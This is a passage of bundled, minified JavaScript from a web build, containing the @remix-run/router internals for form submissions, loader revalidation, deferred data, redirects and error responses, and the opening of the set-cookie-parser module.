      error: getInternalRouterError(405, {
        method: opts.formMethod
      })
    };
  let getInvalidBodyError = () => ({
    path: path2,
    error: getInternalRouterError(400, {
      type: "invalid-body"
    })
  }), rawFormMethod = opts.formMethod || "get", formMethod = normalizeFormMethod ? rawFormMethod.toUpperCase() : rawFormMethod.toLowerCase(), formAction = stripHashFromPath(path2);
  if (opts.body !== void 0) {
    if (opts.formEncType === "text/plain") {
      if (!isMutationMethod(formMethod))
        return getInvalidBodyError();
      let text = typeof opts.body == "string" ? opts.body : opts.body instanceof FormData || opts.body instanceof URLSearchParams ? (
        // https://html.spec.whatwg.org/multipage/form-control-infrastructure.html#plain-text-form-data
        Array.from(opts.body.entries()).reduce((acc, _ref3) => {
          let [name, value] = _ref3;
          return "" + acc + name + "=" + value + `
`;
        }, "")
      ) : String(opts.body);
      return {
        path: path2,
        submission: {
          formMethod,
          formAction,
          formEncType: opts.formEncType,
          formData: void 0,
          json: void 0,
          text
        }
      };
    } else if (opts.formEncType === "application/json") {
      if (!isMutationMethod(formMethod))
        return getInvalidBodyError();
      try {
        let json4 = typeof opts.body == "string" ? JSON.parse(opts.body) : opts.body;
        return {
          path: path2,
          submission: {
            formMethod,
            formAction,
            formEncType: opts.formEncType,
            formData: void 0,
            json: json4,
            text: void 0
          }
        };
      } catch {
        return getInvalidBodyError();
      }
    }
  }
  invariant(typeof FormData == "function", "FormData is not available in this environment");
  let searchParams, formData;
  if (opts.formData)
    searchParams = convertFormDataToSearchParams(opts.formData), formData = opts.formData;
  else if (opts.body instanceof FormData)
    searchParams = convertFormDataToSearchParams(opts.body), formData = opts.body;
  else if (opts.body instanceof URLSearchParams)
    searchParams = opts.body, formData = convertSearchParamsToFormData(searchParams);
  else if (opts.body == null)
    searchParams = new URLSearchParams(), formData = new FormData();
  else
    try {
      searchParams = new URLSearchParams(opts.body), formData = convertSearchParamsToFormData(searchParams);
    } catch {
      return getInvalidBodyError();
    }
  let submission = {
    formMethod,
    formAction,
    formEncType: opts && opts.formEncType || "application/x-www-form-urlencoded",
    formData,
    json: void 0,
    text: void 0
  };
  if (isMutationMethod(submission.formMethod))
    return {
      path: path2,
      submission
    };
  let parsedPath = parsePath(path2);
  return isFetcher && parsedPath.search && hasNakedIndexQuery(parsedPath.search) && searchParams.append("index", ""), parsedPath.search = "?" + searchParams, {
    path: createPath(parsedPath),
    submission
  };
}
function getLoaderMatchesUntilBoundary(matches, boundaryId) {
  let boundaryMatches = matches;
  if (boundaryId) {
    let index = matches.findIndex((m) => m.route.id === boundaryId);
    index >= 0 && (boundaryMatches = matches.slice(0, index));
  }
  return boundaryMatches;
}
function getMatchesToLoad(history, state, matches, submission, location, isRevalidationRequired, cancelledDeferredRoutes, cancelledFetcherLoads, fetchLoadMatches, fetchRedirectIds, routesToUse, basename, pendingActionData, pendingError) {
  let actionResult = pendingError ? Object.values(pendingError)[0] : pendingActionData ? Object.values(pendingActionData)[0] : void 0, currentUrl = history.createURL(state.location), nextUrl = history.createURL(location), boundaryId = pendingError ? Object.keys(pendingError)[0] : void 0, navigationMatches = getLoaderMatchesUntilBoundary(matches, boundaryId).filter((match, index) => {
    if (match.route.lazy)
      return !0;
    if (match.route.loader == null)
      return !1;
    if (isNewLoader(state.loaderData, state.matches[index], match) || cancelledDeferredRoutes.some((id) => id === match.route.id))
      return !0;
    let currentRouteMatch = state.matches[index], nextRouteMatch = match;
    return shouldRevalidateLoader(match, _extends({
      currentUrl,
      currentParams: currentRouteMatch.params,
      nextUrl,
      nextParams: nextRouteMatch.params
    }, submission, {
      actionResult,
      defaultShouldRevalidate: (
        // Forced revalidation due to submission, useRevalidator, or X-Remix-Revalidate
        isRevalidationRequired || // Clicked the same link, resubmitted a GET form
        currentUrl.pathname + currentUrl.search === nextUrl.pathname + nextUrl.search || // Search params affect all loaders
        currentUrl.search !== nextUrl.search || isNewRouteInstance(currentRouteMatch, nextRouteMatch)
      )
    }));
  }), revalidatingFetchers = [];
  return fetchLoadMatches.forEach((f, key) => {
    if (!matches.some((m) => m.route.id === f.routeId))
      return;
    let fetcherMatches = matchRoutes(routesToUse, f.path, basename);
    if (!fetcherMatches) {
      revalidatingFetchers.push({
        key,
        routeId: f.routeId,
        path: f.path,
        matches: null,
        match: null,
        controller: null
      });
      return;
    }
    let fetcher = state.fetchers.get(key), fetcherMatch = getTargetMatch(fetcherMatches, f.path), shouldRevalidate = !1;
    fetchRedirectIds.has(key) ? shouldRevalidate = !1 : cancelledFetcherLoads.includes(key) ? shouldRevalidate = !0 : fetcher && fetcher.state !== "idle" && fetcher.data === void 0 ? shouldRevalidate = isRevalidationRequired : shouldRevalidate = shouldRevalidateLoader(fetcherMatch, _extends({
      currentUrl,
      currentParams: state.matches[state.matches.length - 1].params,
      nextUrl,
      nextParams: matches[matches.length - 1].params
    }, submission, {
      actionResult,
      defaultShouldRevalidate: isRevalidationRequired
    })), shouldRevalidate && revalidatingFetchers.push({
      key,
      routeId: f.routeId,
      path: f.path,
      matches: fetcherMatches,
      match: fetcherMatch,
      controller: new AbortController()
    });
  }), [navigationMatches, revalidatingFetchers];
}
function isNewLoader(currentLoaderData, currentMatch, match) {
  let isNew = (
    // [a] -> [a, b]
    !currentMatch || // [a, b] -> [a, c]
    match.route.id !== currentMatch.route.id
  ), isMissingData = currentLoaderData[match.route.id] === void 0;
  return isNew || isMissingData;
}
function isNewRouteInstance(currentMatch, match) {
  let currentPath = currentMatch.route.path;
  return (
    // param change for this match, /users/123 -> /users/456
    currentMatch.pathname !== match.pathname || // splat param changed, which is not present in match.path
    // e.g. /files/images/avatar.jpg -> files/finances.xls
    currentPath != null && currentPath.endsWith("*") && currentMatch.params["*"] !== match.params["*"]
  );
}
function shouldRevalidateLoader(loaderMatch, arg) {
  if (loaderMatch.route.shouldRevalidate) {
    let routeChoice = loaderMatch.route.shouldRevalidate(arg);
    if (typeof routeChoice == "boolean")
      return routeChoice;
  }
  return arg.defaultShouldRevalidate;
}
async function loadLazyRouteModule(route, mapRouteProperties2, manifest) {
  if (!route.lazy)
    return;
  let lazyRoute = await route.lazy();
  if (!route.lazy)
    return;
  let routeToUpdate = manifest[route.id];
  invariant(routeToUpdate, "No route found in manifest");
  let routeUpdates = {};
  for (let lazyRouteProperty in lazyRoute) {
    let isPropertyStaticallyDefined = routeToUpdate[lazyRouteProperty] !== void 0 && // This property isn't static since it should always be updated based
    // on the route updates
    lazyRouteProperty !== "hasErrorBoundary";
    warning(!isPropertyStaticallyDefined, 'Route "' + routeToUpdate.id + '" has a static property "' + lazyRouteProperty + '" defined but its lazy function is also returning a value for this property. ' + ('The lazy route property "' + lazyRouteProperty + '" will be ignored.')), !isPropertyStaticallyDefined && !immutableRouteKeys.has(lazyRouteProperty) && (routeUpdates[lazyRouteProperty] = lazyRoute[lazyRouteProperty]);
  }
  Object.assign(routeToUpdate, routeUpdates), Object.assign(routeToUpdate, _extends({}, mapRouteProperties2(routeToUpdate), {
    lazy: void 0
  }));
}
async function callLoaderOrAction(type, request, match, matches, manifest, mapRouteProperties2, basename, opts) {
  opts === void 0 && (opts = {});
  let resultType, result, onReject, runHandler = (handler) => {
    let reject, abortPromise = new Promise((_, r) => reject = r);
    return onReject = () => reject(), request.signal.addEventListener("abort", onReject), Promise.race([handler({
      request,
      params: match.params,
      context: opts.requestContext
    }), abortPromise]);
  };
  try {
    let handler = match.route[type];
    if (match.route.lazy)
      if (handler)
        result = (await Promise.all([runHandler(handler), loadLazyRouteModule(match.route, mapRouteProperties2, manifest)]))[0];
      else if (await loadLazyRouteModule(match.route, mapRouteProperties2, manifest), handler = match.route[type], handler)
        result = await runHandler(handler);
      else if (type === "action") {
        let url = new URL(request.url), pathname = url.pathname + url.search;
        throw getInternalRouterError(405, {
          method: request.method,
          pathname,
          routeId: match.route.id
        });
      } else
        return {
          type: ResultType.data,
          data: void 0
        };
    else if (handler)
      result = await runHandler(handler);
    else {
      let url = new URL(request.url), pathname = url.pathname + url.search;
      throw getInternalRouterError(404, {
        pathname
      });
    }
    invariant(result !== void 0, "You defined " + (type === "action" ? "an action" : "a loader") + " for route " + ('"' + match.route.id + "\" but didn't return anything from your `" + type + "` ") + "function. Please return a value or `null`.");
  } catch (e) {
    resultType = ResultType.error, result = e;
  } finally {
    onReject && request.signal.removeEventListener("abort", onReject);
  }
  if (isResponse(result)) {
    let status = result.status;
    if (redirectStatusCodes.has(status)) {
      let location = result.headers.get("Location");
      if (invariant(location, "Redirects returned/thrown from loaders/actions must have a Location header"), !ABSOLUTE_URL_REGEX.test(location))
        location = normalizeTo(new URL(request.url), matches.slice(0, matches.indexOf(match) + 1), basename, !0, location);
      else if (!opts.isStaticRequest) {
        let currentUrl = new URL(request.url), url = location.startsWith("//") ? new URL(currentUrl.protocol + location) : new URL(location), isSameBasename = stripBasename(url.pathname, basename) != null;
        url.origin === currentUrl.origin && isSameBasename && (location = url.pathname + url.search + url.hash);
      }
      if (opts.isStaticRequest)
        throw result.headers.set("Location", location), result;
      return {
        type: ResultType.redirect,
        status,
        location,
        revalidate: result.headers.get("X-Remix-Revalidate") !== null
      };
    }
    if (opts.isRouteRequest)
      throw {
        type: resultType || ResultType.data,
        response: result
      };
    let data, contentType = result.headers.get("Content-Type");
    return contentType && /\bapplication\/json\b/.test(contentType) ? data = await result.json() : data = await result.text(), resultType === ResultType.error ? {
      type: resultType,
      error: new ErrorResponse(status, result.statusText, data),
      headers: result.headers
    } : {
      type: ResultType.data,
      data,
      statusCode: result.status,
      headers: result.headers
    };
  }
  if (resultType === ResultType.error)
    return {
      type: resultType,
      error: result
    };
  if (isDeferredData(result)) {
    var _result$init, _result$init2;
    return {
      type: ResultType.deferred,
      deferredData: result,
      statusCode: (_result$init = result.init) == null ? void 0 : _result$init.status,
      headers: ((_result$init2 = result.init) == null ? void 0 : _result$init2.headers) && new Headers(result.init.headers)
    };
  }
  return {
    type: ResultType.data,
    data: result
  };
}
function createClientSideRequest(history, location, signal, submission) {
  let url = history.createURL(stripHashFromPath(location)).toString(), init = {
    signal
  };
  if (submission && isMutationMethod(submission.formMethod)) {
    let {
      formMethod,
      formEncType
    } = submission;
    init.method = formMethod.toUpperCase(), formEncType === "application/json" ? (init.headers = new Headers({
      "Content-Type": formEncType
    }), init.body = JSON.stringify(submission.json)) : formEncType === "text/plain" ? init.body = submission.text : formEncType === "application/x-www-form-urlencoded" && submission.formData ? init.body = convertFormDataToSearchParams(submission.formData) : init.body = submission.formData;
  }
  return new Request(url, init);
}
function convertFormDataToSearchParams(formData) {
  let searchParams = new URLSearchParams();
  for (let [key, value] of formData.entries())
    searchParams.append(key, typeof value == "string" ? value : value.name);
  return searchParams;
}
function convertSearchParamsToFormData(searchParams) {
  let formData = new FormData();
  for (let [key, value] of searchParams.entries())
    formData.append(key, value);
  return formData;
}
function processRouteLoaderData(matches, matchesToLoad, results, pendingError, activeDeferreds) {
  let loaderData = {}, errors = null, statusCode, foundError = !1, loaderHeaders = {};
  return results.forEach((result, index) => {
    let id = matchesToLoad[index].route.id;
    if (invariant(!isRedirectResult(result), "Cannot handle redirect results in processLoaderData"), isErrorResult(result)) {
      let boundaryMatch = findNearestBoundary(matches, id), error = result.error;
      pendingError && (error = Object.values(pendingError)[0], pendingError = void 0), errors = errors || {}, errors[boundaryMatch.route.id] == null && (errors[boundaryMatch.route.id] = error), loaderData[id] = void 0, foundError || (foundError = !0, statusCode = isRouteErrorResponse(result.error) ? result.error.status : 500), result.headers && (loaderHeaders[id] = result.headers);
    } else
      isDeferredResult(result) ? (activeDeferreds.set(id, result.deferredData), loaderData[id] = result.deferredData.data) : loaderData[id] = result.data, result.statusCode != null && result.statusCode !== 200 && !foundError && (statusCode = result.statusCode), result.headers && (loaderHeaders[id] = result.headers);
  }), pendingError && (errors = pendingError, loaderData[Object.keys(pendingError)[0]] = void 0), {
    loaderData,
    errors,
    statusCode: statusCode || 200,
    loaderHeaders
  };
}
function processLoaderData(state, matches, matchesToLoad, results, pendingError, revalidatingFetchers, fetcherResults, activeDeferreds) {
  let {
    loaderData,
    errors
  } = processRouteLoaderData(matches, matchesToLoad, results, pendingError, activeDeferreds);
  for (let index = 0; index < revalidatingFetchers.length; index++) {
    let {
      key,
      match,
      controller
    } = revalidatingFetchers[index];
    invariant(fetcherResults !== void 0 && fetcherResults[index] !== void 0, "Did not find corresponding fetcher result");
    let result = fetcherResults[index];
    if (!(controller && controller.signal.aborted))
      if (isErrorResult(result)) {
        let boundaryMatch = findNearestBoundary(state.matches, match == null ? void 0 : match.route.id);
        errors && errors[boundaryMatch.route.id] || (errors = _extends({}, errors, {
          [boundaryMatch.route.id]: result.error
        })), state.fetchers.delete(key);
      } else if (isRedirectResult(result))
        invariant(!1, "Unhandled fetcher revalidation redirect");
      else if (isDeferredResult(result))
        invariant(!1, "Unhandled fetcher deferred data");
      else {
        let doneFetcher = getDoneFetcher(result.data);
        state.fetchers.set(key, doneFetcher);
      }
  }
  return {
    loaderData,
    errors
  };
}
function mergeLoaderData(loaderData, newLoaderData, matches, errors) {
  let mergedLoaderData = _extends({}, newLoaderData);
  for (let match of matches) {
    let id = match.route.id;
    if (newLoaderData.hasOwnProperty(id) ? newLoaderData[id] !== void 0 && (mergedLoaderData[id] = newLoaderData[id]) : loaderData[id] !== void 0 && match.route.loader && (mergedLoaderData[id] = loaderData[id]), errors && errors.hasOwnProperty(id))
      break;
  }
  return mergedLoaderData;
}
function findNearestBoundary(matches, routeId) {
  return (routeId ? matches.slice(0, matches.findIndex((m) => m.route.id === routeId) + 1) : [...matches]).reverse().find((m) => m.route.hasErrorBoundary === !0) || matches[0];
}
function getShortCircuitMatches(routes2) {
  let route = routes2.find((r) => r.index || !r.path || r.path === "/") || {
    id: "__shim-error-route__"
  };
  return {
    matches: [{
      params: {},
      pathname: "",
      pathnameBase: "",
      route
    }],
    route
  };
}
function getInternalRouterError(status, _temp4) {
  let {
    pathname,
    routeId,
    method,
    type
  } = _temp4 === void 0 ? {} : _temp4, statusText = "Unknown Server Error", errorMessage = "Unknown @remix-run/router error";
  return status === 400 ? (statusText = "Bad Request", method && pathname && routeId ? errorMessage = "You made a " + method + ' request to "' + pathname + '" but ' + ('did not provide a `loader` for route "' + routeId + '", ') + "so there is no way to handle the request." : type === "defer-action" ? errorMessage = "defer() is not supported in actions" : type === "invalid-body" && (errorMessage = "Unable to encode submission body")) : status === 403 ? (statusText = "Forbidden", errorMessage = 'Route "' + routeId + '" does not match URL "' + pathname + '"') : status === 404 ? (statusText = "Not Found", errorMessage = 'No route matches URL "' + pathname + '"') : status === 405 && (statusText = "Method Not Allowed", method && pathname && routeId ? errorMessage = "You made a " + method.toUpperCase() + ' request to "' + pathname + '" but ' + ('did not provide an `action` for route "' + routeId + '", ') + "so there is no way to handle the request." : method && (errorMessage = 'Invalid request method "' + method.toUpperCase() + '"')), new ErrorResponse(status || 500, statusText, new Error(errorMessage), !0);
}
function findRedirect(results) {
  for (let i = results.length - 1; i >= 0; i--) {
    let result = results[i];
    if (isRedirectResult(result))
      return {
        result,
        idx: i
      };
  }
}
function stripHashFromPath(path2) {
  let parsedPath = typeof path2 == "string" ? parsePath(path2) : path2;
  return createPath(_extends({}, parsedPath, {
    hash: ""
  }));
}
function isHashChangeOnly(a, b) {
  return a.pathname !== b.pathname || a.search !== b.search ? !1 : a.hash === "" ? b.hash !== "" : a.hash === b.hash ? !0 : b.hash !== "";
}
function isDeferredResult(result) {
  return result.type === ResultType.deferred;
}
function isErrorResult(result) {
  return result.type === ResultType.error;
}
function isRedirectResult(result) {
  return (result && result.type) === ResultType.redirect;
}
function isDeferredData(value) {
  let deferred = value;
  return deferred && typeof deferred == "object" && typeof deferred.data == "object" && typeof deferred.subscribe == "function" && typeof deferred.cancel == "function" && typeof deferred.resolveData == "function";
}
function isResponse(value) {
  return value != null && typeof value.status == "number" && typeof value.statusText == "string" && typeof value.headers == "object" && typeof value.body < "u";
}
function isRedirectResponse(result) {
  if (!isResponse(result))
    return !1;
  let status = result.status, location = result.headers.get("Location");
  return status >= 300 && status <= 399 && location != null;
}
function isQueryRouteResponse(obj) {
  return obj && isResponse(obj.response) && (obj.type === ResultType.data || ResultType.error);
}
function isValidMethod(method) {
  return validRequestMethods.has(method.toLowerCase());
}
function isMutationMethod(method) {
  return validMutationMethods.has(method.toLowerCase());
}
async function resolveDeferredResults(currentMatches, matchesToLoad, results, signals, isFetcher, currentLoaderData) {
  for (let index = 0; index < results.length; index++) {
    let result = results[index], match = matchesToLoad[index];
    if (!match)
      continue;
    let currentMatch = currentMatches.find((m) => m.route.id === match.route.id), isRevalidatingLoader = currentMatch != null && !isNewRouteInstance(currentMatch, match) && (currentLoaderData && currentLoaderData[match.route.id]) !== void 0;
    if (isDeferredResult(result) && (isFetcher || isRevalidatingLoader)) {
      let signal = signals[index];
      invariant(signal, "Expected an AbortSignal for revalidating fetcher deferred result"), await resolveDeferredData(result, signal, isFetcher).then((result2) => {
        result2 && (results[index] = result2 || results[index]);
      });
    }
  }
}
async function resolveDeferredData(result, signal, unwrap) {
  if (unwrap === void 0 && (unwrap = !1), !await result.deferredData.resolveData(signal)) {
    if (unwrap)
      try {
        return {
          type: ResultType.data,
          data: result.deferredData.unwrappedData
        };
      } catch (e) {
        return {
          type: ResultType.error,
          error: e
        };
      }
    return {
      type: ResultType.data,
      data: result.deferredData.data
    };
  }
}
function hasNakedIndexQuery(search) {
  return new URLSearchParams(search).getAll("index").some((v) => v === "");
}
function createUseMatchesMatch(match, loaderData) {
  let {
    route,
    pathname,
    params
  } = match;
  return {
    id: route.id,
    pathname,
    params,
    data: loaderData[route.id],
    handle: route.handle
  };
}
function getTargetMatch(matches, location) {
  let search = typeof location == "string" ? parsePath(location).search : location.search;
  if (matches[matches.length - 1].route.index && hasNakedIndexQuery(search || ""))
    return matches[matches.length - 1];
  let pathMatches = getPathContributingMatches(matches);
  return pathMatches[pathMatches.length - 1];
}
function getSubmissionFromNavigation(navigation) {
  let {
    formMethod,
    formAction,
    formEncType,
    text,
    formData,
    json: json4
  } = navigation;
  if (!(!formMethod || !formAction || !formEncType)) {
    if (text != null)
      return {
        formMethod,
        formAction,
        formEncType,
        formData: void 0,
        json: void 0,
        text
      };
    if (formData != null)
      return {
        formMethod,
        formAction,
        formEncType,
        formData,
        json: void 0,
        text: void 0
      };
    if (json4 !== void 0)
      return {
        formMethod,
        formAction,
        formEncType,
        formData: void 0,
        json: json4,
        text: void 0
      };
  }
}
function getLoadingNavigation(location, submission) {
  return submission ? {
    state: "loading",
    location,
    formMethod: submission.formMethod,
    formAction: submission.formAction,
    formEncType: submission.formEncType,
    formData: submission.formData,
    json: submission.json,
    text: submission.text
  } : {
    state: "loading",
    location,
    formMethod: void 0,
    formAction: void 0,
    formEncType: void 0,
    formData: void 0,
    json: void 0,
    text: void 0
  };
}
function getSubmittingNavigation(location, submission) {
  return {
    state: "submitting",
    location,
    formMethod: submission.formMethod,
    formAction: submission.formAction,
    formEncType: submission.formEncType,
    formData: submission.formData,
    json: submission.json,
    text: submission.text
  };
}
function getLoadingFetcher(submission, data) {
  return submission ? {
    state: "loading",
    formMethod: submission.formMethod,
    formAction: submission.formAction,
    formEncType: submission.formEncType,
    formData: submission.formData,
    json: submission.json,
    text: submission.text,
    data,
    " _hasFetcherDoneAnything ": !0
  } : {
    state: "loading",
    formMethod: void 0,
    formAction: void 0,
    formEncType: void 0,
    formData: void 0,
    json: void 0,
    text: void 0,
    data,
    " _hasFetcherDoneAnything ": !0
  };
}
function getSubmittingFetcher(submission, existingFetcher) {
  return {
    state: "submitting",
    formMethod: submission.formMethod,
    formAction: submission.formAction,
    formEncType: submission.formEncType,
    formData: submission.formData,
    json: submission.json,
    text: submission.text,
    data: existingFetcher ? existingFetcher.data : void 0,
    " _hasFetcherDoneAnything ": !0
  };
}
function getDoneFetcher(data) {
  return {
    state: "idle",
    formMethod: void 0,
    formAction: void 0,
    formEncType: void 0,
    formData: void 0,
    json: void 0,
    text: void 0,
    data,
    " _hasFetcherDoneAnything ": !0
  };
}
var Action, PopStateEventType, ResultType, immutableRouteKeys, paramRe, dynamicSegmentValue, indexRouteValue, emptySegmentValue, staticSegmentValue, splatPenalty, isSplat, joinPaths, normalizePathname, normalizeSearch, normalizeHash, json, AbortedDeferredError, DeferredData, defer, redirect, ErrorResponse, validMutationMethodsArr, validMutationMethods, validRequestMethodsArr, validRequestMethods, redirectStatusCodes, redirectPreserveMethodStatusCodes, IDLE_NAVIGATION, IDLE_FETCHER, IDLE_BLOCKER, ABSOLUTE_URL_REGEX, defaultMapRouteProperties, UNSAFE_DEFERRED_SYMBOL, init_router = __esm({
  "node_modules/@remix-run/router/dist/router.js"() {
    (function(Action2) {
      Action2.Pop = "POP", Action2.Push = "PUSH", Action2.Replace = "REPLACE";
    })(Action || (Action = {}));
    PopStateEventType = "popstate";
    (function(ResultType2) {
      ResultType2.data = "data", ResultType2.deferred = "deferred", ResultType2.redirect = "redirect", ResultType2.error = "error";
    })(ResultType || (ResultType = {}));
    immutableRouteKeys = /* @__PURE__ */ new Set(["lazy", "caseSensitive", "path", "id", "index", "children"]);
    paramRe = /^:\w+$/, dynamicSegmentValue = 3, indexRouteValue = 2, emptySegmentValue = 1, staticSegmentValue = 10, splatPenalty = -2, isSplat = (s) => s === "*";
    joinPaths = (paths) => paths.join("/").replace(/\/\/+/g, "/"), normalizePathname = (pathname) => pathname.replace(/\/+$/, "").replace(/^\/*/, "/"), normalizeSearch = (search) => !search || search === "?" ? "" : search.startsWith("?") ? search : "?" + search, normalizeHash = (hash) => !hash || hash === "#" ? "" : hash.startsWith("#") ? hash : "#" + hash, json = function(data, init) {
      init === void 0 && (init = {});
      let responseInit = typeof init == "number" ? {
        status: init
      } : init, headers = new Headers(responseInit.headers);
      return headers.has("Content-Type") || headers.set("Content-Type", "application/json; charset=utf-8"), new Response(JSON.stringify(data), _extends({}, responseInit, {
        headers
      }));
    }, AbortedDeferredError = class extends Error {
    }, DeferredData = class {
      constructor(data, responseInit) {
        this.pendingKeysSet = /* @__PURE__ */ new Set(), this.subscribers = /* @__PURE__ */ new Set(), this.deferredKeys = [], invariant(data && typeof data == "object" && !Array.isArray(data), "defer() only accepts plain objects");
        let reject;
        this.abortPromise = new Promise((_, r) => reject = r), this.controller = new AbortController();
        let onAbort = () => reject(new AbortedDeferredError("Deferred data aborted"));
        this.unlistenAbortSignal = () => this.controller.signal.removeEventListener("abort", onAbort), this.controller.signal.addEventListener("abort", onAbort), this.data = Object.entries(data).reduce((acc, _ref) => {
          let [key, value] = _ref;
          return Object.assign(acc, {
            [key]: this.trackPromise(key, value)
          });
        }, {}), this.done && this.unlistenAbortSignal(), this.init = responseInit;
      }
      trackPromise(key, value) {
        if (!(value instanceof Promise))
          return value;
        this.deferredKeys.push(key), this.pendingKeysSet.add(key);
        let promise = Promise.race([value, this.abortPromise]).then((data) => this.onSettle(promise, key, void 0, data), (error) => this.onSettle(promise, key, error));
        return promise.catch(() => {
        }), Object.defineProperty(promise, "_tracked", {
          get: () => !0
        }), promise;
      }
      onSettle(promise, key, error, data) {
        if (this.controller.signal.aborted && error instanceof AbortedDeferredError)
          return this.unlistenAbortSignal(), Object.defineProperty(promise, "_error", {
            get: () => error
          }), Promise.reject(error);
        if (this.pendingKeysSet.delete(key), this.done && this.unlistenAbortSignal(), error === void 0 && data === void 0) {
          let undefinedError = new Error('Deferred data for key "' + key + '" resolved/rejected with `undefined`, you must resolve/reject with a value or `null`.');
          return Object.defineProperty(promise, "_error", {
            get: () => undefinedError
          }), this.emit(!1, key), Promise.reject(undefinedError);
        }
        return data === void 0 ? (Object.defineProperty(promise, "_error", {
          get: () => error
        }), this.emit(!1, key), Promise.reject(error)) : (Object.defineProperty(promise, "_data", {
          get: () => data
        }), this.emit(!1, key), data);
      }
      emit(aborted, settledKey) {
        this.subscribers.forEach((subscriber) => subscriber(aborted, settledKey));
      }
      subscribe(fn) {
        return this.subscribers.add(fn), () => this.subscribers.delete(fn);
      }
      cancel() {
        this.controller.abort(), this.pendingKeysSet.forEach((v, k) => this.pendingKeysSet.delete(k)), this.emit(!0);
      }
      async resolveData(signal) {
        let aborted = !1;
        if (!this.done) {
          let onAbort = () => this.cancel();
          signal.addEventListener("abort", onAbort), aborted = await new Promise((resolve) => {
            this.subscribe((aborted2) => {
              signal.removeEventListener("abort", onAbort), (aborted2 || this.done) && resolve(aborted2);
            });
          });
        }
        return aborted;
      }
      get done() {
        return this.pendingKeysSet.size === 0;
      }
      get unwrappedData() {
        return invariant(this.data !== null && this.done, "Can only unwrap data on initialized and settled deferreds"), Object.entries(this.data).reduce((acc, _ref2) => {
          let [key, value] = _ref2;
          return Object.assign(acc, {
            [key]: unwrapTrackedPromise(value)
          });
        }, {});
      }
      get pendingKeys() {
        return Array.from(this.pendingKeysSet);
      }
    };
    defer = function(data, init) {
      init === void 0 && (init = {});
      let responseInit = typeof init == "number" ? {
        status: init
      } : init;
      return new DeferredData(data, responseInit);
    }, redirect = function(url, init) {
      init === void 0 && (init = 302);
      let responseInit = init;
      typeof responseInit == "number" ? responseInit = {
        status: responseInit
      } : typeof responseInit.status > "u" && (responseInit.status = 302);
      let headers = new Headers(responseInit.headers);
      return headers.set("Location", url), new Response(null, _extends({}, responseInit, {
        headers
      }));
    }, ErrorResponse = class {
      constructor(status, statusText, data, internal) {
        internal === void 0 && (internal = !1), this.status = status, this.statusText = statusText || "", this.internal = internal, data instanceof Error ? (this.data = data.toString(), this.error = data) : this.data = data;
      }
    };
    validMutationMethodsArr = ["post", "put", "patch", "delete"], validMutationMethods = new Set(validMutationMethodsArr), validRequestMethodsArr = ["get", ...validMutationMethodsArr], validRequestMethods = new Set(validRequestMethodsArr), redirectStatusCodes = /* @__PURE__ */ new Set([301, 302, 303, 307, 308]), redirectPreserveMethodStatusCodes = /* @__PURE__ */ new Set([307, 308]), IDLE_NAVIGATION = {
      state: "idle",
      location: void 0,
      formMethod: void 0,
      formAction: void 0,
      formEncType: void 0,
      formData: void 0,
      json: void 0,
      text: void 0
    }, IDLE_FETCHER = {
      state: "idle",
      data: void 0,
      formMethod: void 0,
      formAction: void 0,
      formEncType: void 0,
      formData: void 0,
      json: void 0,
      text: void 0
    }, IDLE_BLOCKER = {
      state: "unblocked",
      proceed: void 0,
      reset: void 0,
      location: void 0
    }, ABSOLUTE_URL_REGEX = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i, defaultMapRouteProperties = (route) => ({
      hasErrorBoundary: Boolean(route.hasErrorBoundary)
    });
    UNSAFE_DEFERRED_SYMBOL = Symbol("deferred");
  }
});

// node_modules/set-cookie-parser/lib/set-cookie.js
var require_set_cookie = __commonJS({
  "node_modules/set-cookie-parser/lib/set-cookie.js"(exports, module) {
    "use strict";
    var defaultParseOptions = {
      decodeValues: !0,
      map: !1,
      silent: !1
    };
    function isNonEmptyString(str) {
      return typeof str == "string" && !!str.trim();
    }
    function parseString(setCookieValue, options) {
      var parts = setCookieValue.split(";").filter(isNonEmptyString), nameValuePairStr = parts.shift(), parsed = parseNameValuePair(nameValuePairStr), name = parsed.name, value = parsed.value;
      options = options ? Object.assign({}, defaultParseOptions, options) : defaultParseOptions;
      try {
        value = options.decodeValues ? decodeURIComponent(value) : value;
      } catch (e) {
        console.error(
          "set-cookie-parser encountered an error while decoding a cookie with value '" + value + "'. Set options.decodeValues to false to disable this feature.",
          e
        );
      }
      var cookie = {
        name,
        value
      };
      return parts.forEach(function(part) {
        var sides = part.split("="), key = sides.shift().trimLeft().toLowerCase(), value2 = sides.join("=");
        key === "expires" ? cookie.expires = new Date(value2) : key === "max-age" ? cookie.maxAge = parseInt(value2, 10) : key === "secure" ? cookie.secure = !0 : key === "httponly" ? cookie.httpOnly = !0 : key === "samesite" ? cookie.sameSite = value2 : cookie[key] = value2;
      }), cookie;
    }
    function parseNameValuePair(nameValuePairStr) {
      var name = "", value = "", nameValueArr = nameValuePairStr.split("=");
      return nameValueArr.length > 1 ? (name = nameValueArr.shift(), value = nameValueArr.join("=")) : value = nameValuePairStr, { name, value };
    }
    function parse(input, options) {
      if (options = options ? Object.assign({}, defaultParseOptions, options) : defaultParseOptions, !input)
        return options.map ? {} : [];
      if (input.headers)
        if (typeof input.headers.getSetCookie == "function")
          input = input.headers.getSetCookie();
        else if (input.headers["set-cookie"])
          input = input.headers["set-cookie"];
        else {
          var sch = input.headers[Object.keys(input.headers).find(function(key) {
            return key.toLowerCase() === "set-cookie";
          })];
          !sch && input.headers.cookie && !options.silent && console.warn(
            "Warning: set-cookie-parser appears to have been called on a request object. It is designed to parse Set-Cookie headers from responses, not Cookie headers from requests. Set the option {silent: true} to suppress this warning."
          ), input = sch;
        }
      if (Array.isArray(input) || (input = [input]), options = options ? Object.assign({}, defaultParseOptions, options) : defaultParseOptions, options.map) {
        var cookies = {};
        return input.filter(isNonEmptyString).reduce(function(cookies2, str) {
          var cookie = parseString(str, options);
          return cookies2[cookie.name] = cookie, cookies2;
        }, cookies);
      } else
        return input.filter(isNonEmptyString).map(function(str) {
          return parseString(str, options);
        });
    }
    function splitCookiesString2(cookiesString) {
      if (Array.isArray(cookiesString))
        return cookiesString;
      if (typeof cookiesString != "string")
        return [];
      var cookiesStrings = [], pos = 0, start, ch, lastComma, nextStart, cookiesSeparatorFound;
      function skipWhitespace() {
        for (; pos < cookiesString.length && /\s/.test(cookiesString.charAt(pos)); )
          pos += 1;
        return pos < cookiesString.length;
      }
      function notSpecialChar() {
        return ch = cookiesString.charAt(pos), ch !== "=" && ch !== ";" && ch !== ",";
      }
      for (; pos < cookiesString.length; ) {
        for (start = pos, cookiesSeparatorFound = !1; skipWhitespace(); )
          if (ch = cookiesString.charAt(pos), ch === ",") {
